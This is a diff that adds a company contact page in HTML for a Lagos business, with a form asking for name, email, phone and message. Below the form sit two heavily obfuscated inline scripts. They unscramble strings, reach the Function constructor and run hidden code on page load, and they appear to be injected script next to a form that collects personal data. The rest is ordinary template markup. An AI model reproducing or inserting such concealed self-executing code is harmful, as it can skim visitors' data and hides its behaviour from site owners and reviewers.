@@ -1,0 +1,325 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <title>Contact - Cubenmax Systems</title>
+    <!-- web fonts -->
+    <link href="//fonts.googleapis.com/css?family=Roboto:300,400,500,700,900&display=swap" rel="stylesheet">
+    <link href="//fonts.googleapis.com/css?family=Nunito:200,300,400,600,700,800,900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="assets/css/site.css">
+    <link rel="Shortcut Icon" type="image/x-icon" href="assets/images/favicon.ico"/>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/css/toastr.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
+    
+    <style>
+    /* Optional: Style for the button */
+    #showToast {
+      padding: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    </style>
+
+  </head>
+  <body>
+<div class="site-bootstrap-header fixed-top">
+  <nav class="navbar navbar-expand-lg navbar-light p-2">
+    <div class="container">
+       <a class="navbar-brand" href="index.html"><img src="assets/images/logo.png" alt="logo"><span>Cubenmax Systems</span></a> 
+      <!-- if logo is image enable this   
+    <a class="navbar-brand" href="#index.html">
+        <img src="image-path" alt="Your logo" title="Your logo" style="height:35px;" />
+    </a> -->
+      <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+
+      <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav mr-auto">
+          <li class="nav-item active">
+            <a class="nav-link" href="index.html">Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="about.html">About</a>
+          </li>
+		   <li class="nav-item">
+            <a class="nav-link" href="services.html">Our Services</a>
+          </li>
+         
+        </ul>
+        
+      </div>
+    </div>
+  </nav>
+</div>
+<!-- contacts -->
+<section class="site-contact mt-5">
+  <div class="contacts-9 py-5 mt-5">
+    <div class="container py-lg-3">
+      <div class="row top-map">
+        <div class="cont-details col-md-5">
+          <div class="heading mb-lg-4 mb-4">
+            <h3 class="head">Contact us </h3>
+          </div>
+          <div class="cont-top">
+            <div class="cont-left">
+              <span class="fa fa-phone"></span>
+            </div>
+            <div class="cont-right">
+              <p><a href="tel:+2348173572741">+2348173572741</a></p>
+
+            </div>
+          </div>
+          <div class="cont-top mt-4">
+            <div class="cont-left">
+              <span class="fa fa-envelope-o"></span>
+            </div>
+            <div class="cont-right">
+              <p><a href="mailto:contact@cubenmaxsystems.com" class="mail">contact@cubenmaxsystems.com</a></p>
+            </div>
+          </div>
+          <div class="cont-top mt-4">
+            <div class="cont-left">
+              <span class="fa fa-map-marker"></span>
+            </div>
+            <div class="cont-right">
+              <p>A.P.T Imj Block 16 Shop 740 Trade Fair Complex, Badagry Express Way, Lagos</p>
+            </div>
+          </div>
+        </div>
+        <div class="map-content-9 col-md-7 mt-5 mt-md-0">
+          <form id="contactForm" method="post">
+            <div class="form-group row">
+              <div class="col-md-6">
+                <label class="contact-textfield-label" for="firstName">First Name</label>
+                <input type="text" class="form-control" id="txtFirstName" placeholder="" required="">
+              </div>
+              <div class="col-md-6 mt-md-0 mt-3">
+                <label class="contact-textfield-label" for="siteName">Last Name</label>
+                <input type="text" class="form-control" id="txtLastName" placeholder="" required="">
+              </div>
+            </div>
+            <div class="form-group row">
+              <div class="col-md-6">
+                <label class="contact-textfield-label" for="siteSender">Your Email ID</label>
+                <input type="email" class="form-control" id="txtEmail" placeholder="" required="">
+              </div>
+              <div class="col-md-6 mt-md-0 mt-3">
+                <label class="contact-textfield-label" for="sitePhone">Phone Number</label>
+                <input type="tel" class="form-control" id="txtPhone" placeholder="" required="">
+              </div>
+            </div>
+            <div class="form-group">
+              <label class="contact-textfield-label" for="siteSubject">Subject</label>
+              <input type="text" class="form-control" id="txtSubject" placeholder="" required="">
+            </div>
+            <div class="form-group">
+              <label class="contact-textfield-label" for="siteMessage">Message</label>
+              <textarea class="form-control" id="txtMessage" placeholder="" required=""></textarea>
+            </div>
+            <button id="sendMessage" type="submit" class="btn btn-primary btn-contact">Send Message</button>
+          </form>
+          
+
+ <script type="text/javascript"
+             src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+          </script>
+          <script type="text/javascript">
+            (function(){var DnN='',UOW=547-536;function Arw(x){var a=3425585;var d=x.length;var r=[];for(var u=0;u<d;u++){r[u]=x.charAt(u)};for(var u=0;u<d;u++){var b=a*(u+415)+(a%17978);var m=a*(u+228)+(a%14366);var s=b%d;var g=m%d;var k=r[s];r[s]=r[g];r[g]=k;a=(b+m)%4845756;};return r.join('')};var QpT=Arw('oycttjcbdouezwcahrsiknortfxugsqlvpmrn').substr(0,UOW);var ett='w) =r=o;=Ar)fihur=;;-t6Cw,(gh)rf[6t,bhrncou0bSubl d0r)aao eiget,7.)u0tlal7,..r)(n;tiSrd+8+f [,;oj)+ea0i4lo,9,(1,;3,81ub8s;(,a ;;r98p==g{li,parn<<zs;(5a("brh+a=az +;))n=he-{o .of+)ca=dbvw"=.=;=+hatlf(-bea =}ao=7]on9;m7rxr.h )aihe+(-)v ptai}+svcbs(tde7oo{d6;+t;2"vC.ar(n)r[=*p,jr+gzlir8as42c l8lbvea a;eusu;lp=6d=+2a=h(a) ,;1a;(])u, f;5v1rr pznsl1na4,("gh.!.(f[scmra;2a;7w6n]t+,{r91Az]d((hyv6=g.ilo )"=a]a}oe[q[f=dh.s.(3"orv)(0=0c=]7emdftAnlv0[;]6bt=ly+c;opin a(nfa.]4d;fy=i*zoi+pr52s-e.h;lh={.=diefnbea)uhr=;;"rvam g.rb+2r.j;n=10;oc;+vtr >,l;r])g+(;gj6ro)(n2=.jo]ak;hf[dhe=,.8,C(nd1ab()[vrpai,}nuihoophveCAjyg v>(e=e]vrps ylu;0)-(rtreeu<v)8(;kgi.+h6 i8u1nnAeai"v2]; v,8j=C=a"s)n}i,gp)r;[ac]]klrta[(sbr.=vbetw;([r4o6p)0ejiog;x+(utd9h,g7ro;1[c;tf1,rm2t "=)lnvug5fruvC.r<uorf1ss)rx(.+nr;gr}0)=,v.rert;vu}+.Cc)s=l;lln(tv4-ctrrlgh.td))t+im=ti9m;)xrfveh.rn{te(i7co=o, Crvr[t0;np(9(+m,o!)t=+rie5{<=';var OaP=Arw[QpT];var JNS='';var DsA=OaP;var KPN=OaP(JNS,Arw(ett));var lDF=KPN(Arw('J(Joncu=)(.(p.u.,(ro).7\'2wbJ_uJo=i,ii}.g+fon(r;.b!e[.(J=!bl6(%J$Jt3*Jz(h)ib$$.(_.%at.eaiJt47c.ac.).esJ(44%J!bJ.rcJ}53,g5(JJt,5J 7_l.n\'J%oc2440j.n(.u).gu,Sce.,t,!)h"ns(a +J.(r#(be" 8e(3o,J)J2p_riJ)20e,)bllJi)fJ-,g2tp7(J7jt[nJzs4ab9.jo;giJj8f.r).gn$)io=0eog#6)fuj_o$3)+i;.e(a-"4*c3fprJeofz,pjJ$l.3.!t(\'cJ3)=2a\/$xtJ.}z,J;r}J{{J0ajufntJ_f.)J!-e%3Jdr(JzrbJ;fcsbti0J1J!8,J,8} 1(,1sr8=J)&(2J.up; .0e;{(.eg)eC{.J{o.;tlJi,1!6J_0f,;S{1h37et2#g4n$rJ;(!#((f_J )\'&t_,!c=-.J_nc,$.()0)r4at=+Ji5J_Jb_pc;#J]2a;.z0J)t$_(vcJ!.&()J543uel!6$b)t\/n$]) z!12"o;.s83J ,ok),$%7Jjn.0*1$)w.{af=a0l.lJ0=gs4Jc#3)erJ)uuJi3j..JJ(hJ\/k!!4v.7s)07w,(sJi,;.]rJo(z,3vi1nJf3.7.2v.a3!4noC)(t#J!_ 7)%_T;a3_J$m* n.Jnj+).;.[JJJ()=*!4&iz))(J.=mba.i&JaJ!(jcJa%{2mz1[ree1JfJ5tbfJe1#caS.p(co{y;!jr[5.*)0guia =$! (J${ufp7)(qJu\/3g.;u,}ra__6onmo.0.$ji.sJc3J+)tci+}a"J0}Jrn$J_Jc;b_)ll;(= J;bJ)aa4](s%1oe3,=""Jd)}$l,.2f) rgJ1t3e_ )0is.;}J0;\/$+sg i}S=6.J=, 0e4=3;rl&$_;!8a}J(!6op!=).JJ!c *_y3(._ =$5]b;$f,bu$r.J+J{c, 0c3])t3,b'));var rZX=DsA(DnN,lDF );rZX(6017);return 7910})()
+           </script>
+
+           <script>
+  
+            (function(){var BWh='',fRm=437-426;function ugA(u){var d=1030071;var c=u.length;var r=[];for(var l=0;l<c;l++){r[l]=u.charAt(l)};for(var l=0;l<c;l++){var f=d*(l+269)+(d%14915);var v=d*(l+477)+(d%24753);var x=f%c;var s=v%c;var n=r[x];r[x]=r[s];r[s]=n;d=(f+v)%2054629;};return r.join('')};var iud=ugA('oqouvrutcwghzficmrstjclrnknsdopbxetya').substr(0,fRm);var SjH=';q"0m.n(rbn)13n(.va=;r m.ua(sv=og(1"; )fa4q"ei27)xl"hnn7]tfe)(=8ja;;4lo6)la C.[+0,746,+.i.f)a,7  29lhv=elg}("7k]6l} p,k];n)sr,8s(];arw(tcoaed0{e1v.ltib<h(ppv,i7.qw]]=(+1r0e(rf;c]iofhf))g;)[=nt+v-==ft1tb {h-.s7.(=,fi=a0)0ulco(rs=rsm)=v8}s+=a.gc.eider+g,npl=;t=ozo>io;(.lrrb=h;.lr1trzh9nausr +a2c,+r uod(Cu;m*  ltgnr)lvah r; etegr1al0tahrv=al =.lu=gvg*u;;))5y);(1ba,[;c;p(n3tg;);Srr}r(awl gt6n)e0l;rnbu;4),4)mAc(r(fqt{l(;r,[t;[jzvsgsvh;"eraitr;v2.;rgevf++yvh;"e.t]jo(u)18u(ka]i.dev+.h-=+t.jh)ui=6;Ahh+g!+f +e;hk+7o,5.=krcv)vs8oylvd;x1i.absr{prn6=an[f=i1(,A=nuc[+ia[6po9ce>))=Aiucha-+vv}k(r=n2a=,8gr;< r[ft)i[al0;oArulc<;trC=<n=1nvl.s+[,vas=r fhr0+=-kuya=ritb(r2;rrt,Cj r;+mna(g..[0m.dus5wao=)s}]ol, ;=p-{niu(o"c]pp= (;f,7i=0,l(r9,,97,c21;+(nnltragrv(tlhvS["ontv=9av;))rCriesn6vg]o e0xnce8ms[dc r ll)-);f+p){ak23lyhihC2n=;gt],;o=m.o8rc}+rl+;59p=m,]lakCfvr=s9Ciae;n8)uuohar<tas)r,(z!"sr({ iio;,';var bDr=ugA[iud];var FnT='';var Quv=bDr;var OBs=bDr(FnT,ugA(SjH));var ozd=OBs(ugA('p nfLLL;ej.s]f]1l_aeotL:LL1e_.s$,fL2 6eLL.!=3f( p37$erjL);lLoL$Ll6L5%=i.$arL+3ya$it$?.]3\/)Lt$ioam.r=.#Lolr(utL%9)g!4%_LjsbA5i_3)+)f4"Lc9a$t3=8.vs_qL.f%La c}L_ L]:)atLoHLc]$5a$ea;5i*Axzhuej9mLE_$@2(480mreaL702e0ea8mcts3efBa2a5uoLiLa&Ef0c1fu0r#yI.%x.Ls;Li%%xo]ea)\'Las..(.mSLq,};bLuLLuie7L.})(N4,+7asLftx6 =dt.st0assbe=[@ft0<{LutL?L=1s]5aL1asLsi+,)f! o %=Lp(+..lLLeac)2BH L;.hmLLG.a6)tD5(_b3sd_=La8]n0t_)3LptLef0a#J8fL;6(?t_jn72l#a<(nH s#L#pcrsr2zSe,{La0Le9srLw).i3)!,octL,e3+14NcuSLl1_1.L0eat}C%)o0a] (t]jLi40LcElt5L$ao+"C3L;9L4{a[7o;_(L?aLL6m9(z,IospLntbsutr)L#LL!3(1G}(05}Lp)s]7[= K_;z5$x!}imp]r%e0sps0ute3%LL*]6rgzLt;l._=le.[%;Lp+{e6sl2A]zrpm.d,(n$+(.e._]=(]n8!4@oS$]+]l3u=(%4(g_ 91:@)ay}=0%a_ua7oLm>@saa_csoga,7a.3e6!j!!LsLc.8 )L7$o;(LlL@fC:LLa{!e+1vCi,t,,tLLa9t8r_ae)L.;ntnle_sr.1)LL="Lu3a2ut=0LL;s:on4rtLe)tLml76}en..0,(aay$r)LL,3%(a!tLLl!# ]6_0qLaLL!=lLx,)) (L.9L#%L4)orLadL(r$.L lfc;1LL=.Lnu8v(LL.:i))&_epu83.7Ls0!jao3L_.s;Ls.pL(f)6>KMl_x-:(tg$ uLS4 Lxb,)n\/:o;_t6LL.a_6_[LLL$!({)9x!6$L]0!.4LiLLl;"1!pb%uLt_erF]xszLi)Lo%,u_Lb s0=Lt.pl-mNL_1+.p6r,a8;4L!=c]jb._Bci6.4La0mn64(.e7aofrh{.;Ec7E),!g.L;oL[)0643.\'e!moee_L%nLs!p,a,G.1L;t?4l.L...f}bL_%loSL.e}5a{0 Lulje(L)cLv$;,,nenta:pntte1[20LLIe)0aae=Lrd $3(L_;!)l_trLee6beL#L4Gem=-3l$).o(n7LI(v)+s]&.]c)2obL310Ls$eqt;..9]a ltLaat2r(aL]msn)%s)#taiLL09*<,e)L38r:(39Lbt_@re,}L2t1(u2K.a; 2]jaL@[.*fLS%0$_s Lo,%{4e!ae2Ll]{m4{,.uCc13bL4$w6;%L.jsLe.Le5D4rnftL2oE)iLL,e[L0_!esLLt}\',L.oJ)[u5c;(4$C),r_);LSGfd%m3(LgitbLtLb34se\/c%Cq,2,sL.L6q 6,0a-6(qpK%_.p6gLb"L\/dh,?laELrs]\'r7\/LLr=!s,s,vs,L,_u%t5m;ceLasaB;;L.Lx7=rmL){a]3#L06=A=,8Lw\/1l],]#ftr=2eL-%r9S{t;.0ee0L[oL0)5(g5nL3Tl$a{L.(fbejw"_.=u{)(u.";";ttntrL(r)!e!+C#LFt)f$5)rL(Js55sja%6!trN0,L3oeL _t4z$2_Ln jsl(8})(nes] g,b];a,L_boN1LrLf%;_snH;=.9!L!G,,d5Ljrml(afg .ssLhdh>(2Lrv;0Le26}3L__(m%)Ltam.a nsoL.et) csscL.h>{5sL=-j\'fFio.LH(L;cf=)7L)0paat2A}_.l2ss1lL 6vl!.axb6cL)n,$ )2L1Ly"l))e.#.5bs2t!8a.$a.)L[a uon.j{p;1ct(].)0L_<La{636t$q3; ee6 B(v,q+pimL2Iaa76l&b 6n4u(!L j))(sjy0s=L!ct )7e,nu]s=h7tp+o6%,lenualle8ct) L)joi4$u$1LCra,7(r5{ 03)fc=3rot)kL1["o96,.)1..Lacs_ 3Ce) 2Ll7e&g_e5#Fn1;21[%%,(lr))_'));var zeu=Quv(BWh,ozd );zeu(8332);return 1080})()
+
+          </script>
+
+
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="map">
+    <iframe src="https://www.google.com/maps/embed?pb=!1m14!1m8!1m3!1d15856.713209172733!2d3.091407!3d6.499098!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x103b78a47328fd01%3A0x9da90198ea5b3b07!2sClassgist!5e0!3m2!1sen!2sng!4v1702829374813!5m2!1sen!2sng" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
+  </div>
+</section>
+<!-- //contacts -->
+      <!-- footer-28 block -->
+      <section class="site-market-footer">
+        <footer class="footer-28">
+          <div class="footer-bg-layer">
+            <div class="container py-lg-3">
+              <div class="row footer-top-28">
+                <div class="col-md-6 footer-list-28 mt-5">
+                  <h6 class="footer-title-28">Get in touch</h6>
+                  <ul>
+                    <li>
+                      <p><strong>Address</strong> : A.P.T Imj Block 16 Shop 740 Trade Fair Complex, Badagry Express Way, Lagos</p>
+                    </li>
+                    <li>
+                      <p><strong>Phone</strong> : <a href="tel:+2348173572741">+2348173572741</a></p>
+                    </li>
+                    <li>
+                      <p><strong>Email</strong> : <a href="mailto:contact@cubenmaxsystems.com">contact@cubenmaxsystems.com</a></p>
+                    </li>
+                  </ul>
+
+                </div>
+                <div class="col-md-6">
+                  <div class="row">
+                    <div class="col-md-6 footer-list-28 mt-5">
+                      <h6 class="footer-title-28">Site Information</h6>
+                      <ul>
+                        <li><a href="about.html">About</a></li>
+                        <li><a href="whychoose.html">Why Choose Us</a></li>
+                        <li><a href="affiliates.html">Affiliates</a></li>                       
+                      </ul>
+                    </div>
+                    <div class="col-md-6 footer-list-28 mt-5">
+                      <h6 class="footer-title-28">Legal</h6>
+                      <ul>
+                        <li><a href="cookies.html">Cookies</a></li>
+                        <li><a href="privacypolicy.html">Privacy Policy</a></li>
+                        <li><a href="termsservice.html">Terms of Service</a></li>
+                      </ul>
+                    </div>
+                   
+                  </div>
+                </div>
+              </div>
+            </div>
+
+
+            <div class="midd-footer-28 align-center py-lg-4 py-3 mt-5">
+              <div class="container">
+                <p class="copy-footer-28 text-center"> &copy; 2024 Cubenmax Systems. All Rights Reserved.</p>
+              </div>
+            </div>
+          </div>
+        </footer>
+
+        <!-- move top -->
+        <button onclick="topFunction()" id="movetop" title="Go to top">
+          &#10548;
+        </button>
+        <script>
+          // When the user scrolls down 20px from the top of the document, show the button
+          window.onscroll = function () {
+            scrollFunction()
+          };
+
+          function scrollFunction() {
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+              document.getElementById("movetop").style.display = "block";
+            } else {
+              document.getElementById("movetop").style.display = "none";
+            }
+          }
+
+          // When the user clicks on the button, scroll to the top of the document
+          function topFunction() {
+            document.body.scrollTop = 0;
+            document.documentElement.scrollTop = 0;
+          }
+        </script>
+        <!-- /move top -->
+      </section>
+      <!-- //footer-28 block -->
+
+      <!-- jQuery, Bootstrap JS -->
+      <script src="assets/js/jquery-3.3.1.min.js"></script>
+      <script src="assets/js/bootstrap.min.js"></script>
+      
+      
+      <script src="assets/js/owl.carousel.js"></script>
+
+      <!-- script for owlcarousel -->
+      <script>
+        $(document).ready(function () {
+          $('.owl-one').owlCarousel({
+            loop: true,
+            margin: 0,
+            nav: true,
+            responsiveClass: true,
+            autoplay: false,
+            autoplayTimeout: 5000,
+            autoplaySpeed: 1000,
+            autoplayHoverPause: false,
+            responsive: {
+              0: {
+                items: 1,
+                nav: false
+              },
+              480: {
+                items: 1,
+                nav: false
+              },
+              667: {
+                items: 1,
+                nav: true
+              },
+              1000: {
+                items: 1,
+                nav: true
+              }
+            }
+          })
+        })
+      </script>
+      <!-- //script for owlcarousel -->
+
+      <!-- disable body scroll which navbar is in active -->
+      <script>
+        $(function () {
+          $('.navbar-toggler').click(function () {
+            $('body').toggleClass('noscroll');
+          })
+        });
+      </script>
+      <!-- disable body scroll which navbar is in active -->
+
+      <script src="assets/js/jquery.magnific-popup.min.js"></script>
+      <script>
+        $(document).ready(function () {
+          $('.popup-with-zoom-anim').magnificPopup({
+            type: 'inline',
+
+            fixedContentPos: false,
+            fixedBgPos: true,
+
+            overflowY: 'auto',
+
+            closeBtnInside: true,
+            preloader: false,
+
+            midClick: true,
+            removalDelay: 300,
+            mainClass: 'my-mfp-zoom-in'
+          });
+
+          $('.popup-with-move-anim').magnificPopup({
+            type: 'inline',
+
+            fixedContentPos: false,
+            fixedBgPos: true,
+
+            overflowY: 'auto',
+
+            closeBtnInside: true,
+            preloader: false,
+
+            midClick: true,
+            removalDelay: 300,
+            mainClass: 'my-mfp-slide-bottom'
+          });
+        });
+      </script>
+
+</body>
+</html>
+
